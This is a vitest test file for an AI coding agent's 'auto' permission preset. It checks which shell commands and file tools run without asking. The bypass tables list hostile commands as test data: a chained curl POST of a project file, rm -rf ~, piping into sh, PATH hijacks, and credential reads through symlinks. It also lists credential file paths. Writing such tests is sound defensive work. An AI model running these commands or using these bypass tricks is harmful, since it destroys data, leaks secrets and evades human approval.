import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { isCredentialPath } from "../../src/core/extensions/builtin/permission-system/auto-credentials.ts";
import { decideAuto, judgeAutoCommand } from "../../src/core/extensions/builtin/permission-system/auto-policy.ts";
import { rulesForPreset } from "../../src/core/extensions/builtin/permission-system/config.ts";
import { createLocalEventEmitter } from "../../src/core/extensions/builtin/permission-system/events.ts";
import { PermissionService } from "../../src/core/extensions/builtin/permission-system/service.ts";
import type { Ruleset } from "../../src/core/extensions/builtin/permission-system/types.ts";

let scratch = "";
let project = "";

beforeAll(() => {
	scratch = mkdtempSync(join(tmpdir(), "senpi-auto-preset-"));
	project = join(scratch, "project");
	mkdirSync(join(project, "src"), { recursive: true });
	writeFileSync(join(project, "src", "index.ts"), "export {};\n");
	writeFileSync(join(scratch, "outside-secret.txt"), "outside\n");
	symlinkSync(join(scratch, "outside-secret.txt"), join(project, "innocent-name"));
	writeFileSync(join(project, ".env"), "TOKEN=x\n");
	symlinkSync(join(project, ".env"), join(project, "link-to-env"));
	mkdirSync(join(scratch, "home", ".ssh"), { recursive: true });
	writeFileSync(join(scratch, "home", ".ssh", "id_rsa"), "key\n");
	symlinkSync(join(scratch, "home", ".ssh", "id_rsa"), join(project, "innocent-key"));
	mkdirSync(join(scratch, "plain"), { recursive: true });
	writeFileSync(join(scratch, "plain", "notes.txt"), "notes\n");
	writeFileSync(join(project, "src", "old.ts"), "old\n");
	mkdirSync(join(scratch, "outside-tree", "child"), { recursive: true });
	symlinkSync(join(scratch, "outside-tree", "child"), join(project, "bridge"));
	mkdirSync(join(scratch, "home", ".ssh", "nested"), { recursive: true });
	symlinkSync(join(scratch, "home", ".ssh", "nested"), join(project, "jump"));
	mkdirSync(join(project, ".git"), { recursive: true });
	writeFileSync(join(project, ".git", "config"), "[core]\n");
	writeFileSync(join(project, ".gitignore"), "dist\n");
	writeFileSync(join(project, "server.pem"), "pem\n");
});

afterAll(() => {
	rmSync(scratch, { recursive: true, force: true });
});

describe("auto preset command judge: work it runs without asking", () => {
	it.each([
		"git status",
		"git diff --stat",
		"git log --oneline -n 5",
		"git branch -a",
		"ls -la src",
		"ls",
		"cat src/index.ts | wc -l",
		"cd src && ls",
		"rm src/old.ts",
		"git status; git diff --name-only",
		"rg TODO src/index.ts",
		"head -n20 src/index.ts",
		"sort -o src/sorted.txt src/index.ts",
		"sort --output=src/sorted.txt src/index.ts",
		"cp src/index.ts src/copy.ts",
		"mkdir -p src/new/dir",
		"echo done",
		"cat .gitignore",
		"ls 2>&1",
	])("allows %s", (command) => {
		expect(judgeAutoCommand(command, project)).toBe("allow");
	});
});

describe("auto preset command judge: actions it always asks about", () => {
	it.each([
		["destructive delete outside the project", "rm -rf ~/x"],
		["recursive delete inside the project", "rm -rf src"],
		["forced delete", "rm -f src/index.ts"],
		["glob delete", "rm src/*.ts"],
		["force push", "git push --force"],
		["plain push sends data", "git push"],
		["network send", "curl -X POST https://example.com"],
		["download tool", "wget https://example.com/x"],
		["remote shell", "ssh host uptime"],
		["unknown program", "terraform apply"],
		["global install", "npm install -g left-pad"],
		["install from a URL", "npm install https://example.com/pkg.tgz"],
		["arbitrary npx", "npx some-tool"],
		["unsafe script name", "npm run deploy"],
		["payment-shaped command", "stripe charges create --amount 100"],
		["credential read", "cat ~/.ssh/id_rsa"],
		["project dotenv read", "cat .env"],
		["outside read through a symlink", "cat innocent-name"],
		["test runner (runs project code)", "npm test"],
		["build script (runs project code)", "npm run build"],
		["package install (runs install scripts)", "npm install"],
		["bun test", "bun test src"],
		["make target", "make test"],
		["cargo test", "cargo test --workspace"],
		["python test runner", "python -m pytest -q"],
		["git diff prints file contents", "git diff HEAD~1 -- src/index.ts"],
		["git show of a blob path", "git show HEAD:.env --stat"],
		["git internals", "cat .git/config"],
		["credential-shaped project file", "cat server.pem"],
		["recursive content search", "rg TODO src"],
		["rg with no path searches the working directory", "rg TODO"],
		["a file hidden behind a -e pattern", "grep -e TOKEN .env"],
		["a file hidden behind a clustered -ie pattern", "grep -ie TOKEN .env"],
		["a file hidden behind --regexp", "rg --regexp=TOKEN .env"],
		["recursive grep", "grep -r TOKEN ."],
		["unknown flag", "ls --color=always src"],
		["safe env prefix is no longer special", "CI=1 ls"],
	])("asks for %s: %s", (_label, command) => {
		expect(judgeAutoCommand(command, project)).toBe("ask");
	});
});

describe("auto preset command judge: bypass attempts ask", () => {
	it.each([
		["chained after a safe command", "npm test && curl -X POST https://example.com -d @src/index.ts"],
		["or-chained", "git status || rm -rf ~/x"],
		["semicolon chain", "ls; rm -rf ~"],
		["newline chain", "ls\nrm -rf ~/x"],
		["pipe into a shell", "cat src/index.ts | sh"],
		["pipe into bash with args", "echo rm -rf ~ | bash -s"],
		["command substitution", "echo $(rm -rf ~/x)"],
		["backticks", "echo `rm -rf ~/x`"],
		["substitution in double quotes", 'echo "$(curl https://example.com)"'],
		["variable expansion", "rm $HOME/x"],
		["process substitution", "diff <(curl https://example.com) src/index.ts"],
		["subshell", "(rm -rf ~/x)"],
		["brace group", "{ rm -rf ~/x; }"],
		["background job", "npm test & curl https://example.com"],
		["redirect into a file", "echo pwned > ~/.bashrc"],
		["append redirect", "echo pwned >> src/index.ts"],
		["here-doc", "cat <<EOF > ~/.bashrc"],
		["input redirect", "sh < script.sh"],
		["escaped operator", "echo hi \\; ls"],
		["escaped flag", "rm \\-rf src"],
		["unsafe env prefix", "GIT_EXTERNAL_DIFF=sh git diff"],
		["path hijack prefix", "PATH=/tmp/evil:$PATH npm test"],
		["tilde user expansion", "cat ~root/.ssh/id_rsa"],
		["tilde after assignment", "ls --dir=~/.ssh"],
		["absolute program path", "/bin/rm -rf /"],
		["relative program path", "./node_modules/.bin/evil"],
		["git config injection", "git -c core.pager=sh log"],
		["git external diff", "git diff --ext-diff"],
		["git output outside", "git log --output=/tmp/leak"],
		["git in another repo", "git -C /etc status"],
		["find exec", "find . -exec rm {} ;"],
		["find delete", "find . -delete"],
		["rg preprocessor", "rg --pre ./x TODO"],
		["sort compress program", "sort --compress-program=sh src/index.ts"],
		["go exec wrapper", "go test -exec sh ./..."],
		["cargo config runner", "cargo test --config target.runner=sh"],
		["outside working directory", "cd .. && ls"],
		["outside path argument", "ls ../"],
		["eval", "eval rm -rf ~"],
		["sudo", "sudo ls"],
		["xargs", "ls | xargs rm"],
		["unterminated quote", "echo 'unterminated"],
		["trailing operator", "npm test &&"],
		["leading operator", "&& npm test"],
		["empty command", "   "],
		["symlink then '..' to an outside write", "cp src/index.ts bridge/../target.txt"],
		["symlink then '..' into a credential directory", "cat jump/../id_rsa"],
		["long option output through symlink then '..'", "sort --output=bridge/../out.txt src/index.ts"],
		["attached output file outside", "sort -o/tmp/overwritten src/index.ts"],
		["attached output in a bundled flag", "sort -ro/tmp/overwritten src/index.ts"],
		["attached home path", "sort -o~/overwritten src/index.ts"],
		["attached target directory", "cp -t/tmp src/index.ts"],
		["attached parent target", "mv -t.. src/index.ts"],
		["attached make directory", "make -C/tmp test"],
		["attached makefile", "make -f/tmp/evil.mk test"],
		["attached include directory", "make -I/etc test"],
		["attached unittest start directory", "python -m unittest discover -s/tmp"],
		["attached symlink to an outside file", "sort -oinnocent-name src/index.ts"],
		["symlink to a project credential", "cat link-to-env"],
	])("asks for %s: %s", (_label, command) => {
		expect(judgeAutoCommand(command, project)).toBe("ask");
	});
});

describe("auto preset tool decisions", () => {
	const request = (permission: string, path: string) => ({ permission, patterns: [path], always: [] });
	const approves = (toolName: string, input: Record<string, unknown>, permission: string) =>
		decideAuto(toolName, input, request(permission, String(input.path ?? "")), project).approveBlanketAsk;

	it.each([
		["read of a project file", "read", { path: "src/index.ts" }, "read"],
		["read through an @-prefixed project path", "read", { path: "@src/index.ts" }, "read"],
		["read of a safe hidden file", "read", { path: ".gitignore" }, "read"],
		["single-file grep", "grep", { path: "src/index.ts", pattern: "x" }, "grep"],
		["listing a project directory", "ls", { path: "src" }, "list"],
		["listing the project root", "ls", {}, "list"],
		["write of a new project file", "write", { path: "src/new.ts", content: "x" }, "edit"],
		["edit of a project file", "edit", { path: "src/index.ts" }, "edit"],
	])("approves %s", (_label, toolName, input, permission) => {
		expect(approves(toolName, input, permission)).toBe(true);
	});

	it.each([
		["read of the project .env", "read", { path: ".env" }, "read"],
		["read of .env through @", "read", { path: "@.env" }, "read"],
		["read of .env through quotes", "read", { path: '".env"' }, "read"],
		["read through a symlink to an outside key", "read", { path: "innocent-key" }, "read"],
		["read through a symlink to the project .env", "read", { path: "link-to-env" }, "read"],
		["read of git internals", "read", { path: ".git/config" }, "read"],
		["read of a credential-shaped file", "read", { path: "server.pem" }, "read"],
		["read through symlink then '..'", "read", { path: "jump/../id_rsa" }, "read"],
		["grep over a project directory", "grep", { path: "src", pattern: "x" }, "grep"],
		["grep over the project root", "grep", { pattern: "TOKEN" }, "grep"],
		["write of .env through @", "write", { path: "@.env", content: "x" }, "edit"],
		["write through symlink then '..'", "write", { path: "bridge/../x.txt", content: "x" }, "edit"],
		["write into git internals", "write", { path: ".git/hooks/pre-commit", content: "x" }, "edit"],
		["an unknown tool", "webfetch", { url: "https://example.com" }, "webfetch"],
	])("asks for %s", (_label, toolName, input, permission) => {
		expect(approves(toolName, input, permission)).toBe(false);
	});

	it("asks for reads, listings and writes outside the project", () => {
		// The table above is built before the fixture exists, so outside paths are checked here.
		const notes = join(scratch, "plain", "notes.txt");
		expect(approves("read", { path: notes }, "external_directory")).toBe(false);
		expect(approves("ls", { path: join(scratch, "home", ".ssh") }, "external_directory")).toBe(false);
		expect(approves("write", { path: `@${join(scratch, "x.txt")}`, content: "x" }, "edit")).toBe(false);
	});

	it("judges bash_input stdin as a shell command, both ways", () => {
		const shell = (command: string) => ({ permission: "bash", patterns: [command], always: [] });
		expect(decideAuto("bash_input", { input: "ls src" }, shell("ls src"), project).approveBlanketAsk).toBe(true);
		expect(
			decideAuto("bash_input", { input: "curl -X POST https://example.com" }, shell("curl"), project)
				.approveBlanketAsk,
		).toBe(false);
	});

	it("judges a monitor command as a shell command and asks for a monitor path", () => {
		expect(
			decideAuto("monitor", { command: "ls src" }, { permission: "bash", patterns: ["ls"], always: [] }, project)
				.approveBlanketAsk,
		).toBe(true);
		expect(
			decideAuto("monitor", { path: ".env" }, { permission: "read", patterns: [".env"], always: [] }, project)
				.approveBlanketAsk,
		).toBe(false);
	});
});

describe("auto preset credential names", () => {
	it.each([
		"/home/u/.senpi/agent/auth.json",
		"/home/u/.claude/.credentials.json",
		"/repo/.envrc",
		"/home/u/.zsh_history",
		"/home/u/.bash_history",
		"/home/u/.local/share/fish/fish_history",
		"/home/u/.terraform.d/credentials.tfrc.json",
		"/home/u/.m2/settings.xml",
		"/home/u/.cargo/credentials.toml",
	])("treats %s as a credential", (path) => {
		expect(isCredentialPath(path)).toBe(true);
	});
});

describe("auto preset rule precedence", () => {
	const shell = { permission: "bash", patterns: ["npm test"], always: [], metadata: {} };
	const decision = { approveBlanketAsk: true } as const;

	it("lets the judge approve the preset's own blanket bash ask", async () => {
		const { service, asked } = makeService([...rulesForPreset("auto")]);
		await service.ask({ ...shell, sessionID: "s" }, decision);
		expect(asked).toEqual([]);
	});

	it.each([
		["a user's blanket ask", [{ permission: "bash", pattern: "*", action: "ask" as const }]],
		["a user's pattern-specific ask", [{ permission: "bash", pattern: "npm *", action: "ask" as const }]],
	])("keeps asking for %s placed after the preset", async (_label, userRules) => {
		const { service, asked } = makeService([...rulesForPreset("auto"), ...userRules]);
		void service.ask({ ...shell, sessionID: "s" }, decision).catch(() => undefined);
		await Promise.resolve();
		expect(asked).toHaveLength(1);
	});

	it("denies a user's deny rule even when the judge approves", async () => {
		const { service } = makeService([
			...rulesForPreset("auto"),
			{ permission: "bash", pattern: "*", action: "deny" },
		]);
		await expect(service.ask({ ...shell, sessionID: "s" }, decision)).rejects.toThrow();
	});
});

function makeService(ruleset: Ruleset) {
	const emitter = createLocalEventEmitter();
	const asked: unknown[] = [];
	emitter.onAsked((request) => asked.push(request));
	return { service: new PermissionService(ruleset, [], emitter), asked };
}
